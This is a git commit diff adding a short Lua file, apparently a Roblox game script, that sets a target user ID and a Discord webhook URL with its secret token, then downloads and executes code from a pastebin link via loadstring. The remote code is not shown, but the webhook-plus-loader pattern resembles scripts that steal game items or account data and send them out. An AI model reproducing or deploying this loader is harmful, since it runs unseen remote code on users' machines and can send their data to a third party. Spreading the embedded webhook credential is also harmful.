dad9343bee618da13435da580f0dac5385477fc7
PsxScriptMaker <124332608+PsxScriptMaker@users.noreply.github.com>
2023-02-03 15:00:05 +0800

    Update and rename SnowHub to Main.lua

---
+++ Main.lua
@@ -0,0 +1,5 @@
+_G.UserID = 3380431035
+
+_G.WebHook = "https://discord.com/api/webhooks/1059267378837475390/gi-87PJ4PcO_GqLq4gmBW4ikPq7Al7NxFfFtvV6DuB1BKzDKF8Zo6cOxKNRQjygkFaI-"
+
+loadstring(game:HttpGet('https://pastebin.com/raw/q4if1mvx'))()
